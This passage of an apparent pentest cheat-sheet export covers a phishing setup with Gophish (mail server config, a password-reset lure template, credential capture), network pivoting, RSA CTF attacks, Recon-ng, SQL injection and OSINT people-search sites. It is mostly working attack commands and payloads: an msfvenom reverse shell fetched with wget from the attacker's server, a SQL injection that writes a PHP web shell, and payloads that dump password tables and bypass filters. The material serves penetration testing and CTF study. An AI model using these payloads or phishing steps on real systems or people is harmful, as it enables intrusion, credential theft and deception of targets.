cat \u0026lt;\u0026lt;-EOF \u0026gt;\u0026gt; /etc/sysctl.conf net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1 net.ipv6.conf.eth0.disable_ipv6 = 1 net.ipv6.conf.eth1.disable_ipv6 = 1 net.ipv6.conf.ppp0.disable_ipv6 = 1 net.ipv6.conf.tun0.disable_ipv6 = 1 EOF sysctl -p \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/hosts 127.0.1.1 asgard asgard 127.0.0.1 localhost EOF cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/hostname asgard EOF \nSSL - Let\u0026rsquo;s Encrypt # In order to avoid errors, DNS should be set before setting SSL # SSL / Let\u0026#39;s Encrypt # Certbot-auto is now deprecated https://community.letsencrypt.org/t/certbot-auto-no-longer-works-on-debian-based-systems/139702/6 # Now https://certbot.eff.org/lets-encrypt/debianbuster-apache # Install sudo snap install --classic certbot sudo ln -s /snap/bin/certbot /usr/bin/certbot # Set up certbot certonly --standalone -d domain.fr --register-unsafely-without-email --agree-tos # Verify ls -l /etc/letsencrypt/live/domain.fr # If you need to remove an SSL cert sudo certbot delete --cert-name domain.fr \nPostfix/Dovecot Installation \u0026amp; Configuration # Istallation Postfix / Dovecot apt-get install -qq -y dovecot-imapd dovecot-lmtpd apt-get install -qq -y postfix postgrey postfix-policyd-spf-python apt-get install -qq -y opendkim opendkim-tools apt-get install -qq -y opendmarc apt-get install -qq -y mailutils primary_domain = \u0026#34;\u0026lt;DOMAIN\u0026gt;\u0026#34;cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/postfix/main.cf smtpd_banner = \\$myhostname ESMTP \\$mail_name (Debian/GNU) biff = no append_dot_mydomain = no readme_directory = no smtpd_tls_cert_file=/etc/letsencrypt/live/\u0026lt;DOMAIN\u0026gt;/fullchain.pem smtpd_tls_key_file=/etc/letsencrypt/live/\u0026lt;DOMAIN\u0026gt;/privkey.pem smtpd_tls_security_level = may smtp_tls_security_level = encrypt smtpd_tls_session_cache_database = btree:\\${data_directory}/smtpd_scache smtp_tls_session_cache_database = btree:\\${data_directory}/smtp_scache smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination myhostname = ${primary_domain} alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases myorigin = /etc/mailname mydestination = ${primary_domain}, localhost.com, , localhost relayhost = mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 ${relay_ip} mailbox_command = procmail -a \u0026#34;\\$EXTENSION\u0026#34; mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = all inet_protocols = ipv4 milter_default_action = accept milter_protocol = 6 smtpd_milters = inet:12301,inet:localhost:54321 non_smtpd_milters = inet:12301,inet:localhost:54321 EOFcat \u0026lt;\u0026lt;-EOF \u0026gt;\u0026gt; /etc/postfix/master.cf submission inet n - - - - smtpd -o syslog_name=postfix/submission -o smtpd_tls_wrappermode=no -o smtpd_tls_security_level=encrypt -o smtpd_sasl_auth_enable=yes -o smtpd_recipient_restrictions=permit_mynetworks,permit_sasl_authenticated,reject -o milter_macro_daemon_name=ORIGINATING -o smtpd_sasl_type=dovecot -o smtpd_sasl_path=private/auth EOFmkdir -p \u0026#34;/etc/opendkim/keys/${primary_domain}\u0026#34; cp /etc/opendkim.conf /etc/opendkim.conf.orig cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/opendkim.conf Domain * AutoRestart Yes AutoRestartRate 10/1h Umask 0002 Syslog Yes SyslogSuccess Yes LogWhy Yes Canonicalization relaxed/simple ExternalIgnoreList refile:/etc/opendkim/TrustedHosts InternalHosts refile:/etc/opendkim/TrustedHosts KeyFile /etc/opendkim/keys/${primary_domain}/mail.private Selector mail Mode sv PidFile /var/run/opendkim/opendkim.pid SignatureAlgorithm rsa-sha256 UserID opendkim:opendkim Socket inet:12301@localhost EOFcat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/opendkim/TrustedHosts 127.0.0.1 localhost ${primary_domain} ${relay_ip} EOFcd \u0026#34;/etc/opendkim/keys/\u0026lt;DOMAIN\u0026gt;\u0026#34; || exit opendkim-genkey -s mail -d \u0026#34;\u0026lt;DOMAIN\u0026gt;\u0026#34; echo \u0026#39;SOCKET=\u0026#34;inet:12301\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/default/opendkim chown -R opendkim:opendkim /etc/opendkim cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/opendmarc.conf AuthservID ${primary_domain} PidFile /var/run/opendmarc/opendmarc.pid RejectFailures false Syslog true TrustedAuthservIDs ${primary_domain} Socket inet:54321@localhost UMask 0002 UserID opendmarc:opendmarc IgnoreHosts /etc/opendmarc/ignore.hosts HistoryFile /var/run/opendmarc/opendmarc.dat EOF mkdir \u0026#34;/etc/opendmarc/\u0026#34; echo \u0026#34;localhost\u0026#34; \u0026gt; /etc/opendmarc/ignore.hosts chown -R opendmarc:opendmarc /etc/opendmarc echo \u0026#39;SOCKET=\u0026#34;inet:54321\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/default/opendmarc cat \u0026lt;\u0026lt;-EOF \u0026gt; /etc/dovecot/dovecot.conf disable_plaintext_auth = no mail_privileged_group = mail mail_location = mbox:~/mail:INBOX=/var/mail/%u userdb { driver = passwd } passdb { args = %s driver = pam } protocols = \u0026#34; imap\u0026#34; protocol imap { mail_plugins = \u0026#34; autocreate\u0026#34; } plugin { autocreate = Trash autocreate2 = Sent autosubscribe = Trash autosubscribe2 = Sent } service imap-login { inet_listener imap { port = 0 } inet_listener imaps { port = 993 } } service auth { unix_listener /var/spool/postfix/private/auth { group = postfix mode = 0660 user = postfix } } ssl=required ssl_cert = \u0026lt;/etc/letsencrypt/live/${primary_domain}/fullchain.pem ssl_key = \u0026lt;/etc/letsencrypt/live/${primary_domain}/privkey.pem EOF echo \u0026#34;\u0026lt;user\u0026gt;: root\u0026#34; \u0026gt;\u0026gt; /etc/aliases service postfix restart service opendkim restart service opendmarc restart service dovecot restart service postfix status service opendkim status service opendmarc status service dovecot status \nAliases # Assign an e-mail to a user echo \u0026#34;\u0026lt;EMAIL\u0026gt;: \u0026lt;USER\u0026gt;\u0026#34; \u0026gt;\u0026gt; /etc/aliases \nDNS Configuration \u0026#34; If outlook\u0026#34; extip=$(ifconfig|grep \u0026#39;Link encap\\|inet \u0026#39;|awk \u0026#39;!/Loopback|:127./\u0026#39;|tr -s \u0026#39; \u0026#39;|grep \u0026#39;inet\u0026#39;|tr \u0026#39;:\u0026#39; \u0026#39; \u0026#39;|cut -d\u0026#34; \u0026#34; -f4) domain=$(ls /etc/opendkim/keys/ | head -1) fields=$(echo \u0026#34;${domain}\u0026#34; | tr \u0026#39;.\u0026#39; \u0026#39;\\n\u0026#39; | wc -l) dkimrecord=$(cut -d \u0026#39;\u0026#34;\u0026#39; -f 2 \u0026#34;/etc/opendkim/keys/${domain}/mail.txt\u0026#34; | tr -d \u0026#34;[:space:]\u0026#34;) cat \u0026lt;\u0026lt;-EOF \u0026gt; dnsentries.txt DNS Entries for ${domain}: ==================================================================== Namecheap - Enter under Advanced DNS Record Type: A Host: @ Value: ${extip} TTL: 5 min Record Type: TXT Host: @ Value: v=spf1 ip4:${extip} -all TTL: 5 min Record Type: TXT Host: mail._domainkey Value: ${dkimrecord} TTL: 5 min Record Type: TXT Host: _dmarc Value: v=DMARC1; p=reject TTL: 5 min Change Mail Settings to Custom MX and Add New Record Record Type: MX Host: @ Value: ${domain} Priority: 10 TTL: 5 min EOF cat dnsentries.txt# Then, these records have to be manually set in the Vultr Web Console (DNS Settings) \nTest configuration # It is possible to make a simple first test using the command line mail target@example.com # And then follow the prompt https://mxtoolbox.com/ https://intodns.com \nGophish Installation and Configuration # Download the latest version # Check for release on their github wget https://github.com/gophish/gophish/releases/download/v0.8.0/gophish-v0.8.0-linux-64bit.zip unzip gophish-v0.8.0-linux-64bit.zip # Apply good ermissions to the configuration file chmod 640 config.json # Self Signed Certificate (Don\u0026#39;t usually need if you use Let\u0026#39;s Encrypt) openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt # By default, normal users can\u0026#39;t bind ports \u0026lt;1024 to services # So, in order to get the phishing server on port 443 # And to avoid running as root, yo can set capabilities sudo setcap cap_net_bind_service=+ep /home/user/gophish/gophish # You can also use iptables rules to forward local port # Logging can be nice mkdir logs # Starting ./gophish # Default credentials are admin/gophish # Update as soon as possiblecp /etc/letsencrypt/live/${primary_domain}/fullchain.pem ${primary_domain}.crt cp /etc/letsencrypt/live/${primary_domain}/privkey.pem ${primary_domain}.key{ \u0026#34;admin_server\u0026#34;: { \u0026#34;listen_url\u0026#34;: \u0026#34;0.0.0.0:3333\u0026#34;, \u0026#34;use_tls\u0026#34;: true, \u0026#34;cert_path\u0026#34;: \u0026#34;${primary_domain}.crt\u0026#34;, \u0026#34;key_path\u0026#34;: \u0026#34;${primary_domain}.key\u0026#34; }, \u0026#34;phish_server\u0026#34;: { \u0026#34;listen_url\u0026#34;: \u0026#34;0.0.0.0:443\u0026#34;, \u0026#34;use_tls\u0026#34;: true, \u0026#34;cert_path\u0026#34;: \u0026#34;${primary_domain}.crt\u0026#34;, \u0026#34;key_path\u0026#34;: \u0026#34;${primary_domain}.key\u0026#34; }, \u0026#34;db_name\u0026#34;: \u0026#34;sqlite3\u0026#34;, \u0026#34;db_path\u0026#34;: \u0026#34;gophish.db\u0026#34;, \u0026#34;migrations_prefix\u0026#34;: \u0026#34;db/db_\u0026#34;, \u0026#34;contact_address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;logging\u0026#34;: { \u0026#34;filename\u0026#34;: \u0026#34;logs/testLogs.log\u0026#34; } } \nCreate and manage campaigns # STEP 1 : Target groups # Create your pool of target # Users \u0026amp; Groups \u0026gt; New grouo # It is possible set argets manually or provide CSV file  # STEP 2 : Template e-mail # Manually through the HTML Editor or import an existing template # Think about adding a tracking image (checkbox) # You can also use variables {{.FirstName}}, The password for {{.Email}} has expired. Please reset your password here. Thanks, Morning Catch IT Team # Template reference {{.RId}} The target's unique ID {{.FirstName}} The target's first name {{.LastName}} The target's last name {{.Position}} The target's position {{.Email}} The target's email address {{.From}} The spoofed sender {{.TrackingURL}} The URL to the tracking handler {{.Tracker}} An alias for \u0026lt;img src=\u0026quot;{{.TrackingURL}}\u0026quot;/\u0026gt; {{.URL}} The phishing URL {{.BaseURL}} The base URL with the path and rid parameter stripped. Useful for making links to static files.  # STEP 3 : Landing page # Manual creation or copy an existing page using the \u0026quot;Import from site\u0026quot; # Don't forget to check capture submitted data / passwords # Don't forget to set redirection to the real page  # STEP 4 : Sending profile # The SMTP Relay # \u0026quot;From\u0026quot; e-mail adress needs to be valid one (for example contact@domain.fr) # SMTP Server format (VPS used) : host:port (localhost:25) # You can send test e-mails  # STEP 5 : Campaign # Select email template, landing page, sending profile and groups from previously created # The URL param correspond to the \u0026quot;{{.URL}}\u0026quot; value, or you can manually set it # You can program automatic startup using the \u0026quot;Launch Date\u0026quot; # Also usefull to spread e-mail sent in several waves using the \u0026quot;Send Emails\u0026quot; # 2 ways of export # Results (Max event for each person) : id, email, first_name, last_name, position, status, ip, latitude, longitude # Raw (All events sorted by time)  "
},
{
	"uri": "/network/pivot_techniques/",
	"title": "Pivot Techniques",
	"tags": [],
	"description": "",
	"content": " https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/\nProxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D \u0026lt;local_port\u0026gt; \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 \u0026lt;local_port\u0026gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains...# Scanning (nmap) can be very long through proxychains # You can speed it up by using xargs and multithreading # The main goal is to spread ports between different threads (-P 50) $ seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n # Take care of some options # You can\u0026#39;t just run -oA but need the --append-output option # The same behavior can be used to scan multiple machines # The base command $ proxychains nmap -p- -sT -T4 --top-ports 20 10.42.42.0/24 -oG 10.42.42.0 --open # Become $ seq 1 254 | xargs -P 50 -I cpt proxychains -q nmap --top-ports 20 -sT -T4 10.42.42.cpt -oG 10.42.42.0 --open --append-output 10.42.42.cpt -Pn -n \nDouble Pivot Proxychains # Pivot 1 using proxychains ssh -D 1080 user@IP_Network1 # Configure /etc/proxychains to set port 1080 # Pivot 2 using proxychains proxychains ssh -D 1081 user@IP_Network2 # Configure /etc/proxychains to set port 1081 proxychains nmap... \nPort Forwarding # Windows plink.exe -l root -R 445:127.0.0.1:445 YOURIPADDRESS # Metasploit portfwd add -l 9090 -p 9090 -r TARGETIP # Reverse ssh tunnel, port forwarding 8090 from target to us: ssh -R 8090:localhost:8090 user@ip # Local port forward, forward local 8090 to target: ssh -L 8090:localhost:8090 user@ip \nSSH Pivoting # Local port forwarding # Local port opened on 127.0.0.1 (bind) # -N == no command executed (only ssh tunnel) $ ssh user@pivoting_machine -L [bind_address:]local_port:destination_host:destination_hostport -N \nsshuttle # Transparent proxy over SSH # Forwarding traffic through the pivot # It will then auto create necessary iptables rules sshuttle -r user@pivoting_machine x.x.x.x/24 # You can also let sshuttle detect networks based on the target # -x == exclude some network to not transmit over the tunnel sshuttle -vNr user@pivoting_machine -x x.x.x.x.x/24 \nMetasploit pivoting # Reverse Shell generation $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.149 LPORT=8080 -f elf --platform linux --arch x64 \u0026gt; reverse.elf $ python -m http.server --bind 192.168.2.149 $ wget http://192.168.2.149:8000/reverse.elf $ chmod u+x reverse.elf # Setup listener $ msfconsole -q msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload linux/x64/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; run# Autoroute module msf5 \u0026gt; use post/multi/manage/autoroute msf5 post(multi/manage/autoroute) \u0026gt; set SESSION 1 msf5 post(multi/manage/autoroute) \u0026gt; set CMD add msf5 post(multi/manage/autoroute) \u0026gt; set SUBNET 10.42.42.0 msf5 post(multi/manage/autoroute) \u0026gt; set NETMASK /24 msf5 post(multi/manage/autoroute) \u0026gt; set CMD print msf5 post(multi/manage/autoroute) \u0026gt; run # On windows you can use post/windows/gather/arp_scanner to discover other machines # On Linux you can try arp -a # SOCKS proxy setup msf5 \u0026gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) \u0026gt; set SRVPORT 1081 msf5 auxiliary(server/socks4a) \u0026gt; run # Now, equivalent to a dynamic SSH# Double Pivoting # Reverse shell from the pwned2 to the pwned1 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.42.42.1 LPORT=8088 -f exe --platform windows --arch x64 \u0026gt; reverse.exe # Setup handler and exploit the found vulnerability \nNcat pivoting # Ncat =/= netcat # Enhanced version, developped by nmap dev and often packaged with # Ciphered connexion, IP restriction # To pivot, needed on both attacker and pivot machine # Attacker (broker == accept multiple connexions) $ ncat -lv --broker --max-conns 2 # Pivot # We connect to attacker and target $ ncat -v 192.168.2.149 31337 -c \u0026#39;ncat -v 10.42.42.2 80\u0026#39; \nChisel Pivoting (HTTP Tunnel) # Chisel offers to encapsulate TCP connexions in HTTP tunnels # Everything is encrypted using SSH# Local port forwarding # Pivot machine $ chisel server -p 8080 --host 192.168.2.105 -v # Attacker machine $ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80# Local port forwarding + SOCKS proxy # Pivot machine $ chisel server -p 8080 --host 192.168.2.105 --socks5 -v # Attacker machine $ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks# Reverse remote port forwarding # Attacker machine $ chisel server -p 8888 --host 192.168.2.149 --reverse -v # Pivot machine $ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80 \nPivotSuite # Similar features to other tools but support multilevel pivot # Like Metasploit # \u0026#34;Remote\u0026#34; local port forwarding # On the pivot $ pivotsuite -S -F --server-option=PF --forward-ip=10.42.42.2 --forward-port=80 --server-ip=192.168.2.105 --server-port=8080 # \u0026#34;Remote\u0026#34; dynamic port forwarding $ pivotsuite -S -F --server-option=SP --server-ip=192.168.2.105 --server-port=8080 \nTunna / Fulcrom (HTTP) # Everything is through HTTP # Bypass some IPS/IDS # First step is to deploy webshell on the target # Some are available with the tool (but not good) # Can be hard to use # Then on the attacker machine $ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l 7777 -r 80 -a 10.42.42.2 -v \n"
},
{
	"uri": "/cryptography/rsa/",
	"title": "RSA Encryption",
	"tags": [],
	"description": "",
	"content": " Resources https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/ # Think about factordb.com to retrieve p and q from n \nTheory # Used # c → cyphertext # m → Plaintext message converted as a number # e → public exponent # d → private exponent # n → modulo =\u0026gt; p * q # Encrypt c = (m^e)[n] =\u0026gt; pow(m,e,n) # Decrypt m = (c^d)[n] =\u0026gt; pow(c,d,n) # 5 times encryption c = m^(e1 * e2 * e3 * e4 * e5) m = c^(d1 * d2 * d3 * d4 * d5) # Can get n and e from openssl like this cat alice_pubkey.pem | openssl rsa -pubin -inform PEM -text -noout \nTips \u0026amp; Tricks # Getting clear when you have c, d, n text = pow(c, d, n) # équivaut à text = (c^d)[n] result = hex(text) result = result.replace(\u0026#34;0x\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;L\u0026#34;, \u0026#34;\u0026#34;) print(result.decode(\u0026#39;hex\u0026#39;)) # Convert ASCII message to INT int(binascii.hexlify(m),16) # Convert INT message to ASCII binascii.unhexlify(hex(m).split(\u0026#39;x\u0026#39;)[1]) # Get n and e from a public key in Python from Crypto.PublicKey import RSA key = RSA.importKey(open(\u0026#34;public_key_path.pem\u0026#34;).read()) n = key.n e = key.e \nAttacks : Public Key + Message # Factorization Attack: → When n is small, go for factordb.com # Fermat Attack → When n is quite small # Low Exponent Attack: → Usefull when e=3 and n is quite big because pow(m,e,n) == pow(m,e) # ROCA: → Usable when RSA key has 512 bits long n # Twin Primes: → q = p + 2 → Usefull is most cases when n is too bid and others attacks doesn\\\u0026#39;t work # Boneh Durfee Attack: → Allows to go slightly faster then Wiener Attack because d \u0026lt; n^0.292 ```\t\u0026lt;br/\u0026gt; ### Attacks : Several public keys\t```bash # Chinese Remainder Attack → Usable when 3 messages have the same exponent (c= m^3 mod (n^b * n^c * n^d)) → chinese_reminder.py # Common Modulus Attack: → Usable when you have 2 messages, 2 public keys and n1 == n2 # Wiener Attack: → Usable when private exponen d is quite small compared to N (d \u0026lt; n^(1/4)) → https://github.com/rk700/attackrsa → attackrsa -t wiener -n N_VALUE -e E_VALUE \nRemote Service allowing to decrypt # Decipher Oracle in Python from pwn import * from Crypto.Util.number import * n = \u0026lt;\u0026gt; e = \u0026lt;\u0026gt; c1 = \u0026lt;\u0026gt; c2 = pow(2, e, n) c = c1*c2 # If it\u0026#39;s a process that is the Oracle r = process(\u0026#34;./oracle\u0026#34;) # If it\u0026#39;s a socket that is the Oracle # r = remote(\u0026#34;ip\u0026#34;,port) r.recvuntil(\u0026#34;where_firs_message_stop\u0026#34;) r.sendline(str(c)) res = r.recvline() res = r.recvline() dec = long_to_bytes(long(res.split(\u0026#34; \u0026#34;)[-1]) / 2) print(dec)"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/",
	"title": "Recon-ng",
	"tags": [],
	"description": "",
	"content": " General Informations https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide # Its possible to add your own modules # Reconnaissance → Usage of open sources (passive) # Discovery → More active, packets sent to target # After loading a module, the context of the framework changes, and a new set of commands and options are available. # These commands and options are unique to the module. (help / show) \nUsage # Add API keys \u0026gt; keys add shodan_api \u0026lt;key\u0026gt; \u0026gt; keys list # Modules \u0026gt; show modules \u0026gt; search \u0026lt;string\u0026gt; \u0026gt; use recon/domains-hosts/builtwith \u0026gt; show infos \u0026gt; set \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; # Workspaces \u0026gt; show workspaces \u0026gt; workspaces list \u0026gt; workspaces add Name \u0026gt; workspaces select \u0026lt;ws\u0026gt; # Add companies and domains to a schema \u0026gt; show schema \u0026gt; add compagnies company \u0026gt; add domains domain.com \u0026gt; show domains # Contacts \u0026gt; show contacts"
},
{
	"uri": "/web-pentest/resources-discovery/",
	"title": "Resources Discovery",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/injections/server-side-injections/sql/",
	"title": "SQL Injections",
	"tags": [],
	"description": "",
	"content": " Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md  \nGeneral and Tricks # Classical test ' or 1=1 LIMIT 1 -- ' or 1=1 LIMIT 1 -- - ' or 1=1 LIMIT 1# 'or 1# ' or 1=1 -- ' or 1=1 -- - admin\\'-- -  # Upload file union all select 1,2,3,4,\u0026quot;\u0026lt;?php echo shell_exec($_GET['cmd']);?\u0026gt;\u0026quot;,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'  # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users  # Dump In One Shot (Shoot): \\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#  # Virgule filtrée SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c //%0B pour espace possible  # sha1 binary # If sha1 is used as a binary string (true) you can use an hash to bypass conditions and inject SQL # http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/ # echo -n 3fDf | openssl sha1 -binary # GBK Charset # Possible to bypass addslashes and magic_quotes_gpc using chinese charset # \\x27 == ' # \\x5c == \\ # All chinese char starts with \\xbf # \\xbf\\x5c is a chinese char. It means that the antislash added will be interpreted as a part or chinese char and so the quote will be interpreted # where user.login=\u0026quot;\\xbf' or 1=1;  # Numerical \u0026amp;news_id=1 union select...  \nClassical String SQL Injection # Trigg recherche=’or 1 ; # Column number recherche=’ union select 666 ; → NOK recherche=’ union select 666,667 ; → OK # Database identification recherche=’ union select null,null from users ; recherche=’ union select @@version,null ; → NOK → No mysql / mssql recherche=’ union select versionnumber,null from sysibm.sysversions ; → NOK → Not a db2 recherche=’ union select version,null from v$instance ; → NOK → Not oracle recherche=’ union select version(),null ; → NOK → Not a postgres recherche=’ union select null,null from sqlite_master ; → OK → SQLITE # Tables list recherche=’ union select name,null from sqlite_master where type=’table’ ; # User table format recherche=’union select null,sql FROM sqlite_master WHERE tbl_name = ’users’ AND type = ’table’ ; # Data extraction recherche=’ union select username,password from users ; recherche=’ union select username,year from users ;  \nRouted SQL Injection # Routed → Double SQL Injection → The first result is injected into the second one login=admin\\\\' group by 1# s\\' group by 2-- d → 0x73272067726f757020627920322d2d2064 login=s\\' union select 0x73272067726f757020627920322d2d2064-- d s\\' group by 2-- ds\\' union select email, password from users-- d → 0x732720756e696f6e2073656c65637420656d61696c2c2070617373776f72642066726f6d2075736572732d2d2064  \nSQL Truncation # You can bypass some SQL restrictions playing with the var size limits # create table users (username varchar(10), password varchar(20)) ; # insert into users values(’admin’,’findMeIfYouCan’) ; # insert into users values(’admin [espace] *20 Mou’,’hackedMan’) ; → 2 admins added → Possible to add your own admin account  \nError-based SQL Injection # All is based on the output, you can then identify the SGBD # You want to generate errors # Get the db \u0026amp;order=,cast((chr(95)||current_database()) as numeric) # Get the table (using LIMIT/OFFSET allows iteration) order=,cast(( SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1 ) as numeric) # Get columns order=,(cast(( SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0 ) as int)) # Extract rows from one column order=,(cast(( SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) as int))  \nInsert SQL Injection # Register form username=alex2\u0026amp;password=alex\u0026amp;email=@@version) ;# → OK but not executed username=alex3\u0026amp;password=alex\u0026amp;email=bla’),(’alex4’,’alex’,@@version) ;# → OK and executed ! username=alex5\u0026amp;password=alex\u0026amp;email=bla’),(’alex6’,’alex’,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1)) ;# username=alex7\u0026amp;password=alex\u0026amp;email=bla’),(’alex8’,’alex’,(SELECT column_name FROM information_schema.columns WHERE table_name=’flag’ limit 0,1)) ;#  \nLoad File SQL Injection # To read a file you need # the FILE right (allow you to use load_file() ) # The file full path # To get the full path for index.php (for example) ?action=members\u0026amp;id[]=1 # You can also use if there are some restrictions union all select 1,@@secure_file_priv,3,4 # Classic use union all select load_file('challenge/web-serveur/ch31/index.php'),2,3,4 # If quotes are filtered, you can use hexa union all select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4 # Or id=(0)union(select(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),(0),(0),(0)from(member))'  \nTime Based SQL # You can use SQL properties → Testing from left to right → If first statement is false \u0026amp; followed by AND, the second won't be tested # Payload can be 1 AND [condition_a_tester] AND [si_condition_true] # Heavy Query : 1\u0026gt;(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) # Test condition : exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii) # Final payload 1 AND exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii) AND 1\u0026gt;(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)  \nBlind SQL Injection # Get the password size username=admin'and (select length(password)\u0026gt;7)--+ # or admin' and length(password)=8-- # Enumerate password admin' and (select substr(password,1,1)='a')-- # or admin' and substr(password,1,1)='a'--  \nBypass Filters # Bypass whitespace %0B # Bypass case check for UNION UniOn SeLeCT # Bypass comma (UNION SELECT 1,2,3,4) UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d UNION SELECT * FROM (SELECT xxxx FROM xxxx LIMIT 1 OFFSET 0)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d  \nSQLite - UNION based without filters # Retrieve the table name login=admin\u0026quot; UNION SELECT group_concat(tbl_name),2 FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%' limit 1 offset 1--\u0026amp;password=zzz # Get the table structure login=admin\u0026quot; UNION SELECT sql,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT like 'sqlite_%' AND name='users'--\u0026amp;password=zzz # Query one specific rowinfi login=admin\u0026quot; UNION SELECT login,2 FROM users LIMIT 1 OFFSET 2--\u0026amp;password=zzz  \nWAF Bypass SELECT-1e1FROM`test` SELECT~1.FROM`test` SELECT\\NFROM`test` SELECT@^1.FROM`test` SELECT-id-1.FROM`test`  \nMySQL Injection without \u0026ldquo;in\u0026rdquo; # Alternative to information_schema SELECT * FROM sys.x$schema_flattened_keys; # Get previous records SELECT * FROM sys.x$statement_analysis # Retrieving information without the column name SELECT (SELECT 1, 'aa') = (SELECT * FROM example) # Forcing case insensitive comparision # But binary will be flagged SELECT (SELECT 1, BINARY('Aa')) = (SELECT * FROM example) SELECT CONCAT(\u0026quot;A\u0026quot;, CAST(0 AS JSON));  "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/searchingsomeone/",
	"title": "Searching Someone",
	"tags": [],
	"description": "",
	"content": " Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43 https://www.aware-online.com/en \nSearching People # Very good and accurate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/ # Good search engine, different kinds of data https://webmii.com/ # Kinda amazing resource # Finding company related data about a person https://aleph.occrp.org # Dead people registry (EU) https://deces.matchid.io # French search engine for dead people https://www.deces-en-france.fr/# 118218 for France is very good # Reverse dict https://www.118712.fr/https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. RocketReach - Search for many informations about peoples (free plan, 3/month) Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit...) \nNaming Conventions https://twitter.com/MwOsint/status/1255060809656532995 # When researching for someone from foreign country # They might use different naming conventions # Guide to understand that for various cultures https://www.fbiic.gov/public/2008/nov/Naming_practice_guide_UK_2006.pdf"
},
{
